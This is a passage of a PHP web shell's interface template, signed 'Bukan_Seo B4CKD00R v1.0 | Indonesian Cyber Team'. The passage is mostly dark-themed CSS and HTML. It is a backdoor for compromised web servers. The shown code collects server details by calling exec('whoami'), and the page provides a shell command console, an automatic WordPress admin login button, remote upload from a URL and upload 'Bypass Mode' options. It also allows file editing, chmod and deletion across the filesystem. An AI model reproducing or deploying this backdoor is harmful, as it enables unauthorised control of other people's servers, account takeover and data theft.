  td.actions a[title*="Hapus"] { color: #FF6347; } /* Tomato (a shade of red) for Delete */

  /* --- FIX: Mengembalikan warna nama file dan folder --- */
  /* Aturan baru untuk warna teks nama file/folder */
  table tbody td:first-child a {
      color: #E0E0E0; /* Off-white for general text */
      text-decoration: none;
      transition: color 0.2s;
  }
  table tbody td:first-child a:hover {
      color: #FF66CC; /* Pink on hover for file/folder name */
      text-decoration: underline;
  }

  /* Aturan baru untuk warna ikon folder dan file di kolom nama */
  table tbody td:first-child .fas.fa-folder {
      color: #FF0000; /* Red for folder icon */
      margin-right: 5px;
  }
  table tbody td:first-child .fas.fa-file {
      color: #FFFFFF; /* White for file icon */
      margin-right: 5px;
  }
  /* --- AKHIR FIX --- */

  /* Code Editor Section */
  .code-editor-section h3 {
    color: #FF0000; /* Red */
    font-size: 1.5em;
    margin-bottom: 15px;
    text-align: center;
    border-bottom: 1px dashed rgba(255,0,0,0.3);
    padding-bottom: 10px;
  }
  .code-editor-section .filename-display {
    color: #FF66CC; /* Pink highlight filename */
    font-family: 'Share Tech Mono', monospace;
    font-size: 1.1em;
    text-shadow: 0 0 5px rgba(255,102,204,0.5);
  }
  textarea {
    width: 100%;
    height: 400px;
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FFFFFF;
    resize: vertical;
    border-radius: 3px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 1em;
    border: 1px solid #FF66CC; /* Pink border */
    box-shadow: 0 0 10px rgba(255,102,204,0.5); /* Pink glow */
    padding: 15px;
  }
  .code-editor-actions {
    margin-top: 15px;
    display: flex;
    gap: 10px;
    justify-content: center;
    flex-wrap: wrap;
  }
  .code-editor-actions .btn {
      padding: 12px 25px;
  }
  .code-editor-actions .btn:last-child {
      border-color: #FF0000; /* Red border for Cancel */
      box-shadow: 0 0 10px rgba(255,0,0,0.5);
  }
  .code-editor-actions .btn:last-child:hover {
      background: linear-gradient(135deg, #FF0000, #FF66CC);
      box-shadow: 0 0 20px rgba(255,0,0,0.7);
  }

  /* Terminal Section */
  .file-operations-section .terminal-section {
    margin-top: 20px;
  }

  #shellInput {
    padding: 12px;
    border: none;
    border-radius: 3px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 1em;
    background-color: rgba(0, 0, 0, 0.80); /* Transparent black input */
    color: #FFFFFF; /* White */
    border: 1px solid #FFFFFF; /* White border */
    box-shadow: 0 0 8px rgba(255,255,255,0.4);
    width: 100%;
    margin-bottom: 10px;
  }
  #shellForm button {
    width: 100%;
    padding: 12px;
    border: 2px solid #FF66CC; /* Pink border */
    border-radius: 4px;
    background-color: #0A0A0A; /* Dark background */
    color: #FFFFFF; /* White text */
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 0 10px rgba(255,102,204,0.5); /* Pink glow */
  }
  #shellForm button:hover {
    background: linear-gradient(135deg, #FF0000, #FF66CC); /* Red to Pink gradient */
    color: #0A0A0A;
    box-shadow: 0 0 20px rgba(255,0,0,0.7);
  }
  #shellOutput {
    margin-top: 10px;
    background: rgba(0, 0, 0, 0.75); /* Transparent black */
    padding: 10px;
    border-radius: 3px;
    max-height: 300px;
    overflow: auto;
    font-family: 'Share Tech Mono', monospace;
    white-space: pre-wrap;
    word-wrap: break-word;
    color: #FF66CC; /* Pink text for output */
    border: 1px solid #FF66CC; /* Pink border */
    box-shadow: 0 0 10px rgba(255,102,204,0.5); /* Pink glow */
  }
  /* Custom Scrollbar for Terminal Output */
  #shellOutput::-webkit-scrollbar { width: 8px; }
  #shellOutput::-webkit-scrollbar-track { background: #1A1A1A; border-radius: 10px; }
  #shellOutput::-webkit-scrollbar-thumb { background: #FF66CC; border-radius: 10px; } /* Pink scrollbar thumb */
  #shellOutput::-webkit-scrollbar-thumb:hover { background: #FF0000; } /* Red on hover */


  /* Footer */
  .app-footer {
    padding: 20px;
    text-align: center;
    border-top: 2px solid #FF0000; /* Red separator */
    margin-top: 20px;
    box-shadow: 0 -2px 10px rgba(255,0,0,0.3);
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: 15px;
  }
  .footer-info {
      color: #666666; /* Dark grey */
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.9em;
  }

  /* Message container styles */
  .message-container {
    position: sticky;
    top: 0;
    width: 100%;
    z-index: 1000;
    margin-bottom: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }
  .message {
    padding: 10px 20px;
    border-radius: 5px;
    margin-bottom: 10px;
    font-weight: bold;
    text-align: center;
    animation: fadeOut 5s forwards;
    opacity: 1;
    max-width: 800px;
    width: 100%;
    box-sizing: border-box;
    position: relative;
  }

  @keyframes fadeOut {
    0% { opacity: 1; transform: translateY(0); }
    80% { opacity: 1; transform: translateY(0); }
    100% { opacity: 0; transform: translateY(-20px); display: none; }
  }

  .message.success-message {
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FFFFFF; /* White */
    border: 1px solid #FFFFFF; /* White border */
    box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
  }
  .message.error-message {
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FF0000; /* Red */
    border: 1px solid #FF0000; /* Red border */
    box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
  }
  .message.warning-message {
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FF66CC; /* Pink */
    border: 1px solid #FF66CC; /* Pink border */
    box-shadow: 0 0 10px rgba(255, 102, 204, 0.5);
  }

  /* Modal styles */
  .modal {
    display: none;
    position: fixed;
    z-index: 9999;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: auto;
    background-color: rgba(0,0,0,0.9); /* Very dark, opaque overlay */
    padding-top: 50px;
    justify-content: center;
    align-items: center;
  }
  .modal-content {
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black for modal */
    margin: auto;
    padding: 25px;
    border: 2px solid #FF66CC; /* Pink border */
    width: 90%;
    max-width: 450px;
    border-radius: 8px;
    color: #FFFFFF;
    position: relative;
    box-shadow: 0 0 20px rgba(255,102,204,0.7); /* Strong pink glow */
    animation: modalPopIn 0.3s ease-out forwards;
  }
  @keyframes modalPopIn {
    from { opacity: 0; transform: scale(0.9); }
    to { opacity: 1; transform: scale(1); }
  }
  .modal-content h3 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 1.6em;
      border-bottom: 1px dashed rgba(255,255,255,0.2);
      padding-bottom: 10px;
  }
  .modal-content #modalFolder h3, #modalUpload h3, #modalDropUpload h3 { color: #FF66CC; } /* Pink */
  .modal-content #modalFile h3, #modalRemote h3 { color: #FF0000; } /* Red */
  /* NEW: Modal headers for new features */
  .modal-content #modalRename h3 { color: #FF66CC; } /* Pink */
  .modal-content #modalChmod h3 { color: #FF0000; } /* Red */


  .close {
    position: absolute;
    top: 15px;
    right: 20px;
    color: #FFFFFF; /* White close button */
    font-size: 30px;
    font-weight: bold;
    cursor: pointer;
    transition: color 0.3s, transform 0.3s;
  }
  .close:hover {
    color: #FF0000; /* Red on hover */
    transform: rotate(90deg);
  }
  .modal input[type=text], .modal input[type=file], .modal input[type=url] {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    border: none;
    border-radius: 3px;
    background-color: rgba(0, 0, 0, 0.80); /* Transparent black */
    color: #FFFFFF; /* White */
    font-family: 'Share Tech Mono', monospace;
    border: 1px solid #FF66CC; /* Pink border */
    box-shadow: 0 0 8px rgba(255,102,204,0.4);
  }
  .modal button {
    width: 100%;
    margin-top: 20px;
    padding: 12px 25px;
    border: 2px solid #FF0000; /* Red border */
    background-color: rgba(0, 0, 0, 0.75); /* Transparent black */
    color: #FFFFFF; /* White */
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 0 10px rgba(255,0,0,0.5);
  }
  .modal button:hover {
    transform: scale(1.02);
    background: linear-gradient(135deg, #FF66CC, #FF0000); /* Pink to Red gradient */
    color: #0A0A0A; /* Dark text */
    box-shadow: 0 0 20px rgba(255,102,204,0.7);
  }

  /* Bypass Checkbox Styling */
  .checkbox-container {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 10px;
      margin-bottom: 5px;
  }
  .checkbox-container input[type="checkbox"] {
      width: 20px;
      height: 20px;
      min-width: 20px;
      min-height: 20px;
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      border: 2px solid #FF66CC; /* Pink border */
      border-radius: 4px;
      background-color: rgba(5,5,5,0.7);
      cursor: pointer;
      position: relative;
      transition: all 0.2s ease-in-out;
  }
  .checkbox-container input[type="checkbox"]:checked {
      background-color: #FF0000; /* Red when checked */
      border-color: #FF0000;
      box-shadow: 0 0 10px rgba(255,0,0,0.7);
  }
  .checkbox-container input[type="checkbox"]::after {
      content: '\f00c';
      font-family: 'Font Awesome 5 Free';
      font-weight: 900;
      color: #0A0A0A; /* Dark color for checkmark */
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 14px;
      opacity: 0;
      transition: opacity 0.2s ease-in-out;
  }
  .checkbox-container input[type="checkbox"]:checked::after {
      opacity: 1;
  }


  /* Drag & Drop area styles */
  #dropArea {
    border: 3px dashed #FF0000; /* Red dashed border */
    border-radius: 8px;
    padding: 40px;
    text-align: center;
    margin-top: 20px;
    background-color: rgba(0,0,0,0.70); /* Transparent black */
    cursor: pointer;
    color: #FFFFFF;
    transition: all 0.3s;
    box-shadow: 0 0 15px rgba(255,0,0,0.6);
  }
  #dropArea.hover {
    background-color: rgba(255,102,204,0.2); /* Light pink background on hover */
    border-color: #FF66CC; /* Pink */
    box-shadow: 0 0 25px rgba(255,102,204,0.9);
  }
  #dropArea p {
    font-family: 'Orbitron', sans-serif;
    font-size: 1.4em;
    margin: 0;
  }
  #dropProgress {
      color: #FF66CC; /* Pink */
      font-family: 'Share Tech Mono', monospace;
      margin-top: 15px;
      font-size: 1.1em;
      text-shadow: 0 0 5px rgba(255,102,204,0.5);
  }

  /* Responsive adjustments for smaller screens */
  @media (max-width: 1024px) {
    .app-header h1 {
        font-size: 2.2em;
    }
  }

  @media (max-width: 768px) {
    .app-header {
        padding: 15px;
        margin-bottom: 15px;
    }
    .app-header h1 {
        font-size: 1.8em;
    }
    .header-divider {
        width: 90%;
    }
    .breadcrumb-area {
        padding: 8px 10px;
    }
    .breadcrumb-area a {
        font-size: 0.9em;
    }
    .breadcrumb-area .separator-char {
        font-size: 1em;
    }
    .button-grid {
        grid-template-columns: repeat(2, 1fr);
    }
    .btn {
        padding: 10px 15px;
        font-size: 0.9em;
    }
    .btn i {
        font-size: 1em;
    }
    .module-panel {
        padding: 15px;
    }
    .module-panel h2 {
        font-size: 1.3em;
        margin-bottom: 10px;
    }
    th, td {
        padding: 8px;
        font-size: 0.8em;
    }
    /* Actions column */
    td.actions {
        padding: 3px 5px;
    }
    td.actions a {
        padding: 3px;
        margin: 0 2px;
    }
    td.actions a i {
        font-size: 1em;
    }
    textarea {
        height: 300px;
        padding: 10px;
    }
    #shellInput {
        padding: 10px;
        font-size: 0.9em;
    }
    #shellOutput {
        padding: 8px;
        font-size: 0.8em;
    }
    .modal-content {
        padding: 20px;
        max-width: 95%;
    }
    .modal-content h3 {
        font-size: 1.4em;
    }
    .close {
        font-size: 26px;
    }
    .modal input[type=text], .modal input[type=file], .modal input[type=url], .modal button {
        padding: 10px;
        font-size: 0.9em;
    }
    #dropArea {
        padding: 25px;
    }
    #dropArea p {
        font-size: 1.1em;
    }
    .footer-info {
        font-size: 0.8em;
    }
</style>
</head>
<body>

<canvas id="background-canvas"></canvas>

<div class="main-wrapper">
    <?php display_messages(); // Tampilkan pesan berhasil/gagal di sini ?>
    <header class="app-header">
        <h1>File Manager - Robot Elektrik</h1>
        <hr class="header-divider">
        <!-- header-controls div removed as its content has been moved -->
    </header>

    <main class="file-manager-main">
        <!-- INFORMASI SERVER -->
        <section class="server-info-section module-panel">
            <h2><i class="fas fa-server"></i> INFORMASI SERVER</h2>
            <table>
                <tbody>
                    <tr>
                        <td>System OS</td>
                        <td><?php echo e(php_uname()); ?></td>
                    </tr>
                    <tr>
                        <td>Web Server</td>
                        <td><?php echo e($_SERVER['SERVER_SOFTWARE']); ?></td>
                    </tr>
                    <tr>
                        <td>PHP Version</td>
                        <td><?php echo e(phpversion()); ?></td>
                    </tr>
                    <tr>
                        <td>User</td>
                        <td><?php echo e(function_exists('get_current_user') ? get_current_user() : (function_exists('exec') ? trim(exec('whoami')) : 'N/A')); ?></td>
                    </tr>
                    <tr>
                        <td>Group</td>
                        <td><?php echo e(function_exists('posix_getgrgid') && function_exists('getmygid') ? posix_getgrgid(getmygid())['name'] : (function_exists('exec') ? trim(exec('id -gn')) : 'N/A')); ?></td>
                    </tr>
                    <tr>
                        <td>Server IP</td>
                        <td><?php echo e($_SERVER['SERVER_ADDR']); ?></td>
                    </tr>
                    <tr>
                        <td>Your IP</td>
                        <td><?php echo e($_SERVER['REMOTE_ADDR']); ?></td>
                    </tr>
                    <tr>
                        <td>Hard Disk (Free/Total)</td>
                        <td>
                            <?php
                            $disk_total_space = function_exists('disk_total_space') ? @disk_total_space('.') : 0;
                            $disk_free_space = function_exists('disk_free_space') ? @disk_free_space('.') : 0;

                            if ($disk_total_space > 0) {
                                $free_gb = number_format($disk_free_space / (1024 * 1024 * 1024), 2);
                                $total_gb = number_format($disk_total_space / (1024 * 1024 * 1024), 2);
                                echo e("{$free_gb} GB / {$total_gb} GB");
                            } else {
                                echo 'N/A';
                            }
                            ?>
                        </td>
                    </tr>
                    <tr>
                        <td>Safe Mode</td>
                        <td><?php echo e(ini_get('safe_mode') ? 'On' : 'Off'); ?></td>
                    </tr>
                    <tr>
                        <td>Disable Functions</td>
                        <td>
                            <?php
                            $disabled_functions = ini_get('disable_functions');
                            echo e(empty($disabled_functions) ? 'None' : $disabled_functions);
                            ?>
                        </td>
                    </tr>
                </tbody>
            </table>
        </section>

        <!-- Bagian "OPERASI FILE" dipindahkan ke sini, di bawah Konsol Perintah -->
        <section class="file-operations-section module-panel">
            <h2><i class="fas fa-wrench"></i> OPERASI FILE</h2>
            <!-- Tombol Auto Login WordPress dipindahkan ke sini -->
            <form class="wp-login-form" method="post" onsubmit="return confirm('<?php echo $is_wordpress_loadable ? 'Anda akan dialihkan ke dashboard WordPress.' : 'WordPress tidak ditemukan. Periksa instalasi WordPress Anda atau pastikan wp-load.php dapat diakses.' ?>');">
                <button class="btn-auto-login" type="submit" name="auto_login_wp" <?php echo !$is_wordpress_loadable ? 'disabled title="WordPress tidak terdeteksi atau wp-load.php tidak dapat diakses."' : ''; ?>>
                    <?php echo $is_wordpress_loadable ? 'Auto Login WordPress' : 'WordPress Tidak Ditemukan'; ?>
                </button>
            </form>
            <div class="button-grid">
                <button class="btn" id="btnCreateFolder"><i>&#128193;</i> Folder</button>
                <button class="btn" id="btnCreateFile"><i>&#128193;</i> File</button>
                <button class="btn" id="btnUploadFile"><i>&#128229;</i> Upload V.1</button>
                <button class="btn" id="btnUploadV2"><i>&#128229;</i> Upload V.2</button>
                <button class="btn" id="btnRemoteUpload"><i>&#128279;</i> Remote</button>
            </div>

            <!-- Bagian "KONSOL PERINTAH" dipindahkan ke sini, di bawah tombol-tombol -->
            <section class="terminal-section module-panel">
                <h2><i class="fas fa-terminal"></i> KONSOL PERINTAH</h2>
                <form id="shellForm" method="post" onsubmit="return false;">
                    <input type="text" name="command" id="shellInput" placeholder="Masukkan perintah shell" autocomplete="off"/>
                    <button type="button" onclick="executeShell()">Jalankan Perintah</button>
                </form>
                <div id="shellOutput"></div>
            </section>
        </section>

        <!-- Bagian edit file (jika ada) -->
        <?php if (isset($_GET['edit']) && !empty($_GET['edit'])):
            $editFile = realpath($_GET['edit']); // Menggunakan 'edit' sebagai path langsung
            // Pastikan $editFile ada dan merupakan file di dalam direktori yang sah
            // strpos untuk mencegah pengeditan file di luar direktori akses
            if ($editFile && is_file($editFile) && strpos($editFile, $f) === 0) {
                $content = file_get_contents($editFile);
            } else {
                set_message('error', 'Akses ditolak: File tidak valid atau di luar direktori akses.');
                header("Location: ".$_SERVER['PHP_SELF']."?f=".urlencode($f));
                exit;
            }
        ?>
            <section class="code-editor-section module-panel">
                <h2><i class="fas fa-code"></i> FILE EDITOR <br><span class="filename-display"><?php echo e(basename($editFile)); ?></span></h2>
                <form method="post">
                    <input type="hidden" name="edit_filepath" value="<?php echo e($editFile); ?>">
                    <textarea name="text" spellcheck="false"><?php echo e($content); ?></textarea>
                    <div class="code-editor-actions">
                        <input type="submit" value="Simpan Perubahan" class="btn"/>
                        <a href="?f=<?php echo urlencode($f); ?>" class="btn">Batal</a>
                    </div>
                </form>
            </section>
        <?php else: ?>
            <!-- Tabel daftar folder dan file -->
            <section class="file-list-section module-panel">
                <h2><i class="fas fa-folder-open"></i> DIREKTORI SAAT INI</h2>
                <!-- Breadcrumb area moved here -->
                <div class="breadcrumb-area">
                    <nav>
                        <?php
                        $currentPath = $f;
                        $pathParts = explode(DIRECTORY_SEPARATOR, $currentPath);
                        $accPath = '';
                        foreach ($pathParts as $idx => $part) {
                            // Logika untuk menangani root pada Windows atau Unix
                            if ($part === '' && $idx === 0) {
                                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                                    // Untuk Windows, set ke Document Root atau drive letter
                                    $accPath = $_SERVER["DOCUMENT_ROOT"];
                                    if (empty($accPath)) { // Fallback if DOCUMENT_ROOT is empty/not set
                                        $accPath = substr(str_replace("\\", "/", realpath('.')), 0, 3); // C:/
                                    }
                                } else {
                                    $accPath = '/';
                                }
                                echo "<a href='?f=".urlencode($accPath)."'>/</a>";
                                // Hanya tampilkan separator jika ada bagian path setelah root
                                if (count($pathParts) > 1 && $pathParts[1] !== '') echo "<span class='separator-char'>/</span>";
                                continue;
                            }

                            if ($part === '') continue; // Lewati bagian kosong dari multiple slashes atau leading slash setelah root pada Unix

                            if ($accPath === '/') { // Untuk sistem mirip Unix setelah root
                                $accPath .= $part;
                            } else if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && $idx === 0 && !empty($part)) {
                                 // Tangani drive letter pada Windows (misal: C:)
                                $accPath = $part . DIRECTORY_SEPARATOR;
                            } else {
                                $accPath .= DIRECTORY_SEPARATOR . $part;
                            }

                            echo "<a href='?f=".urlencode($accPath)."'>".e($part)."</a>";
                            // Tampilkan separator jika bukan elemen terakhir dan bagian path berikutnya tidak kosong (misal: menghindari //)
                            if ($idx < count($pathParts)-1 && $pathParts[$idx+1] !== '') {
                                echo "<span class='separator-char'>/</span>";
                            }
                        }
                        ?>
                    </nav>
                </div>
                <!-- End of moved breadcrumb area -->
                <table>
                    <thead>
                        <tr>
                            <th>Nama</th>
                            <th>Tipe</th>
                            <th>Ukuran</th>
                            <th>Permission</th> <!-- CHANGED: Header dari "Terakhir Dimodifikasi" menjadi "Permission" -->
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    $items = scandir($f);
                    $folders = [];
                    $files = [];

                    // Pisahkan folder dan file
                    foreach ($items as $item) {
                        if ($item === '.' || $item === '..') continue;
                        $fullPath = $f . DIRECTORY_SEPARATOR . $item;
                        if (is_dir($fullPath)) {
                            $folders[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    }

                    // Urutkan folder dan file secara alfabetis
                    sort($folders);
                    sort($files);

                    // Tampilkan folder dulu
                    // Tambahkan ".." untuk navigasi ke direktori induk
                    $parentDir = dirname($f);
                    // Jangan tampilkan ".." jika sudah berada di root sistem file atau document root
                    if (realpath($f) !== realpath(DIRECTORY_SEPARATOR) && realpath($f) !== realpath($_SERVER["DOCUMENT_ROOT"])) {
                        ?>
                        <tr>
                            <td>
                                <a href="?f=<?php echo urlencode($parentDir); ?>"><i class="fas fa-arrow-up"></i> ..</a>
                            </td>
                            <td>Folder (Parent)</td>
                            <td>-</td>
                            <td><?php echo e(get_permissions_string($parentDir)); ?></td> <!-- ADDED: Permission for parent dir -->
                            <td class="actions"></td>
                        </tr>
                        <?php
                    }

                    foreach ($folders as $item):
                        $fullPath = $f . DIRECTORY_SEPARATOR . $item;
                        $sizeFormatted = '-'; // Ukuran tidak berlaku untuk folder
                        $permsOctal = sprintf('%o', fileperms($fullPath) & 0777); // Dapatkan izin oktal untuk modal chmod
                        $permsString = get_permissions_string($fullPath); // Dapatkan izin simbolik untuk tampilan
                        ?>
                        <tr>
                            <td>
                                <a href="?f=<?php echo urlencode($fullPath); ?>"><i class="fas fa-folder"></i> <?php echo e($item); ?></a>
                            </td>
                            <td>Folder</td>
                            <td><?php echo $sizeFormatted; ?></td>
                            <td><?php echo e($permsString); ?></td> <!-- CHANGED: Tampilkan string permission -->
                            <td class="actions">
                                <a href="#" onclick="openRenameModal('<?php echo e($item); ?>', 'folder')" title="Ganti Nama"><i class="fas fa-i-cursor"></i></a>
                                <a href="#" onclick="openChmodModal('<?php echo e($item); ?>', '<?php echo e($permsOctal); ?>', 'folder')" title="Ubah Izin"><i class="fas fa-key"></i></a>
                                <!-- START OF FIX: Confirmation message updated for recursive delete -->
                                <a href="?f=<?php echo urlencode($f); ?>&rmdir=<?php echo urlencode($item); ?>" onclick="return confirm('Hapus folder <?php echo e($item); ?> dan semua isinya?')" title="Hapus"><i class="fas fa-trash-alt"></i></a>
                                <!-- END OF FIX -->
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <!-- Lalu tampilkan file -->
                    <?php
                    foreach ($files as $item):
                        $fullPath = $f . DIRECTORY_SEPARATOR . $item;
                        $size = filesize($fullPath);
                        $sizeFormatted = number_format($size / 1024, 2) . ' KB';
                        $permsOctal = sprintf('%o', fileperms($fullPath) & 0777); // Dapatkan izin oktal untuk modal chmod
                        $permsString = get_permissions_string($fullPath); // Dapatkan izin simbolik untuk tampilan
                        ?>
                        <tr>
                            <td>
                                <a href="?f=<?php echo urlencode($f); ?>&edit=<?php echo urlencode($fullPath); ?>"><i class="fas fa-file"></i> <?php echo e($item); ?></a>
                            </td>
                            <td>File</td>
                            <td><?php echo $sizeFormatted; ?></td>
                            <td><?php echo e($permsString); ?></td> <!-- CHANGED: Tampilkan string permission -->
                            <td class="actions">
                                <a href="?f=<?php echo urlencode($f); ?>&edit=<?php echo urlencode($fullPath); ?>" title="Edit File"><i class="fas fa-edit"></i></a>
                                <a href="#" onclick="openRenameModal('<?php echo e($item); ?>', 'file')" title="Ganti Nama"><i class="fas fa-i-cursor"></i></a>
                                <a href="#" onclick="openChmodModal('<?php echo e($item); ?>', '<?php echo e($permsOctal); ?>', 'file')" title="Ubah Izin"><i class="fas fa-key"></i></a>
                                <a href="?f=<?php echo urlencode($f); ?>&unlink=<?php echo urlencode($item); ?>" onclick="return confirm('Hapus file <?php echo e($item); ?>?')" title="Hapus"><i class="fas fa-trash-alt"></i></a>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            </section>
        <?php endif; ?>

    </main>

    <footer class="app-footer">
        <!-- Removed logout form and button as requested -->
        <!-- <form class="logout-form" method="post">
            <button class="btn" name="logout"><i>&#128682;</i> Logout</button>
        </form> -->
        <div class="footer-info">Bukan_Seo B4CKD00R v1.0 | Indonesian Cyber Team</div>
    </footer>
</div>

<!-- Modal buat folder -->
<div id="modalFolder" class="modal">
  <div class="modal-content">
    <span class="close" data-close="modalFolder">&times;</span>
    <h3>Buat Folder Baru</h3>
    <form id="formCreateFolder" method="post">
      <input type="text" name="mkdir" id="inputFolderName" placeholder="Nama Folder" maxlength="100" required />
      <button type="submit">Buat</button>
    </form>
  </div>
</div>

<!-- Modal buat file -->
<div id="modalFile" class="modal">
  <div class="modal-content">
    <span class="close" data-close="modalFile">&times;</span>
    <h3>Buat File Baru</h3>
    <form id="formCreateFile" method="post">
      <input type="text" name="mkfile" id="inputFileName" placeholder="Nama File" maxlength="100" required />
      <button type="submit">Buat</button>
    </form>
  </div>
</div>

<!-- Modal upload file V.1 -->
<div id="modalUpload" class="modal">
  <div class="modal-content">
    <span class="close" data-close="modalUpload">&times;</span>
    <h3>Upload File (V.1)</h3>
    <form id="formUploadFile" method="post" enctype="multipart/form-data">
      <input type="file" name="upload_file" id="inputUploadFile" required />
      <div class="checkbox-container">
          <input type="checkbox" id="bypass_mode_v1" name="bypass_mode_v1" />
          <label for="bypass_mode_v1">Bypass Mode (Opsional)</label>
      </div>
      <button type="submit">Upload</button>
    </form>
  </div>
</div>

<!-- Modal remote upload dari URL -->
<div id="modalRemote" class="modal">
  <div class="modal-content">
    <span class="close" data-close="modalRemote">&times;</span>
    <h3>Remote Upload via URL</h3>
    <form id="formRemoteUpload" method="post">
      <input type="url" name="remote_url" id="inputRemoteUrl" placeholder="Masukkan URL file" required />
      <div class="checkbox-container">
          <input type="checkbox" id="bypass_mode_remote" name="bypass_mode_remote" />
          <label for="bypass_mode_remote">Bypass Mode (Opsional)</label>
      </div>
      <button type="submit">Upload</button>
    </form>
  </div>
</div>

<!-- Modal Drag & Drop Upload V.2 -->
<div id="modalDropUpload" class="modal">
  <div class="modal-content" style="max-width:600px;">
    <span class="close" data-close="modalDropUpload">&times;</span>
    <h3>Upload File via Drag & Drop (V.2)</h3>
    <div id="dropArea">
      <p>Drop file di sini atau klik untuk memilih file</p>
      <input type="file" id="dropFileInput" style="display:none;" />
    </div>
    <div class="checkbox-container" style="margin-top: 15px;">
        <input type="checkbox" id="bypass_mode_v2" name="bypass_mode_v2" />
        <label for="bypass_mode_v2">Bypass Mode (Opsional)</label>
    </div>
    <div id="dropProgress" style="margin-top:10px; display:none;">Mengunggah...</div>
  </div>
</div>

<!-- NEW: Modal untuk Ganti Nama (Rename) -->
<div id="modalRename" class="modal">
  <div class="modal-content">
    <span class="close" data-close="modalRename">&times;</span>
    <h3 id="renameModalTitle">Ganti Nama</h3>
    <form id="formRename" method="post">
      <input type="hidden" name="action" value="rename" />
      <input type="hidden" name="old_name" id="renameOldName" />
      <input type="text" name="new_name" id="renameNewName" placeholder="Nama Baru" maxlength="100" required />
      <button type="submit">Ganti Nama</button>
    </form>
  </div>
</div>

<!-- NEW: Modal untuk Ubah Permission (Chmod) -->
<div id="modalChmod" class="modal">
  <div class="modal-content">
    <span class="close" data-close="modalChmod">&times;</span>
    <h3 id="chmodModalTitle">Ubah Izin (CHMOD)</h3>
    <form id="formChmod" method="post">
      <input type="hidden" name="action" value="chmod" />
      <input type="hidden" name="item_name" id="chmodItemName" />
      <input type="text" name="permissions" id="chmodPermissions" placeholder="Misal: 755" pattern="[0-7]{3}" title="Masukkan 3 digit angka oktal (000-777)" maxlength="3" required />
      <button type="submit">Ubah Izin</button>
    </form>
  </div>
</div>


<!-- Background animation script -->
<script>
const canvas = document.getElementById('background-canvas');
const ctx = canvas.getContext('2d');

let width = window.innerWidth;
let height = window.innerHeight;
canvas.width = width;
canvas.height = height;

window.addEventListener('resize', () => {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
});

// Partikel dan garis (Neural Network / Circuit Board effect)
const particlesCount = 150; // More particles
const particles = [];

for(let i=0; i<particlesCount; i++){
    particles.push({
        x: Math.random() * width,
        y: Math.random() * height,
        vx: (Math.random() - 0.5) * 1.5, // Faster movement
        vy: (Math.random() - 0.5) * 1.5,
        size: Math.random() * 2 + 1,
        color: Math.random() > 0.5 ? '#FF66CC' : '#FFFFFF' // Mix of pink and white
    });
}

const lines = [];
const maxLines = 100; // More lines for a busier "circuit" look

for(let i=0; i<maxLines; i++){
    lines.push({
        x1: Math.random() * width,
        y1: Math.random() * height,
        x2: Math.random() * width,
        y2: Math.random() * height,
        alpha: Math.random() * 0.7 + 0.3, // Lines are always somewhat visible
        speedX: (Math.random() - 0.5)*1, // Faster lines
        speedY: (Math.random() - 0.5)*1,
        color: Math.random() > 0.5 ? '#FF0000' : '#FF66CC' // Mix of red and pink
    });
}

function animate() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.15)'; // Black background, slightly transparent for trail effect
    ctx.fillRect(0, 0, width, height);

    for(let p of particles){
        p.x += p.vx;
        p.y += p.vy;
        if(p.x<0 || p.x>width) p.vx *= -1;
        if(p.y<0 || p.y>height) p.vy *= -1;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.size, 0, Math.PI*2);
        ctx.fillStyle = p.color; // Use particle's color
        ctx.fill();

        // Connect particles with lines if close enough
        for(let otherP of particles) {
            if(p === otherP) continue;
            const dist = Math.sqrt(Math.pow(p.x - otherP.x, 2) + Math.pow(p.y - otherP.y, 2));
            if (dist < 100) {
                // Determine line color based on particle colors or a fixed theme color
                const lineColor = (p.color === '#FF66CC' && otherP.color === '#FFFFFF') ? '#FF0000' : p.color; // Example: Pink-white connection becomes red
                ctx.strokeStyle = `rgba(${parseInt(lineColor.substring(1,3), 16)},${parseInt(lineColor.substring(3,5), 16)},${parseInt(lineColor.substring(5,7), 16)}, ${1 - (dist / 100)})`;
                ctx.lineWidth = 0.5;
                ctx.beginPath();
                ctx.moveTo(p.x, p.y);
                ctx.lineTo(otherP.x, otherP.y);
                ctx.stroke();
            }
        }
    }

    for(let line of lines){
        line.x1 += line.speedX;
        line.y1 += line.speedY;
        line.x2 += line.speedX;
        line.y2 += line.speedY;

        if(line.x1<0 || line.x1>width) line.speedX *= -1;
        if(line.y1<0 || line.y1>height) line.speedY *= -1;
        if(line.x2<0 || line.x2>width) line.speedX *= -1;
        if(line.y2<0 || line.y2>height) line.speedY *= -1;

        ctx.strokeStyle = `rgba(${parseInt(line.color.substring(1,3), 16)},${parseInt(line.color.substring(3,5), 16)},${parseInt(line.color.substring(5,7), 16)},${line.alpha})`;
        ctx.lineWidth = 1;
